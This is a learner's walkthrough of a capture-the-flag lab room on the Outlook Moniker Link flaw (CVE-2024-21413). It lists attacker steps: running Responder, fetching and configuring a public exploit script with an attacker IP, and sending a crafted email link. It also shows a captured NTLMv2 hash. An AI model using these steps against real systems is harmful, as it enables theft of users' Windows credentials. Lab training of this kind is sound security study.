## Walkthrough of Moniker_Link room





## Theory - What will we learn?
* This room envolves learing, exploiting and defending against Moniker_Link vulnerability
* Also knows as `CVE-2024-21413`




### Exploiting
* We'll use the outlook mail application to send a simple mail using a python script
* The main well contain a simple link to our attackers ip
* the link well end with `!`, which disables the alert on outlook system
* We will run responder
* victims host will send the attacker ntlm credentials, to be captured by us


### On attackers machine
1. check the interface of the THM network(using `ifconfig`)
2. run `responder -I $INTERFACE`
3. download the `exploit.py` script from `https://github.com/CMNatic/CVE-2024-21413`
4. change the  `ATTACKERS_IP` in the html content to the machine you set up responder with
5. change `Servers_ip` in the server veriable to victims ip(ip of the thm machine)
6. Run the script using `python exploit.py` and enter password --> `attacker`
7. If its shown `email sent` , your good!!
9. go to the victims host and click the link inside the outlook mail you just recived
10. Check the responder, you shuld see output similar to this:
```bash
[SMB] NTLMv2-SSP Client   : 10.64.184.153
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
[SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:4545d36ed2b03b2d:F76D28E3D4196815809E417AF3BCAF30:010100000000000080C6A9349279DC0116C59C3F886DD1FD00000000020008003000370030004D0001001E00570049004E002D00500046004B00490054004A003500530039003300500004003400570049004E002D00500046004B00490054004A00350053003900330050002E003000370030004D002E004C004F00430041004C00030014003000370030004D002E004C004F00430041004C00050014003000370030004D002E004C004F00430041004C000700080080C6A9349279DC0106000400020000000800300030000000000000000000000000200000A95ECD30A198163F0E11A1DD11AAEF3382A628E2834D86275B2FD262406F78F50A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100370031002E00320033003800000000000000000000000000            
```

#### I Have added the yara rule to detect this in the same directory


## You completed the room!!!
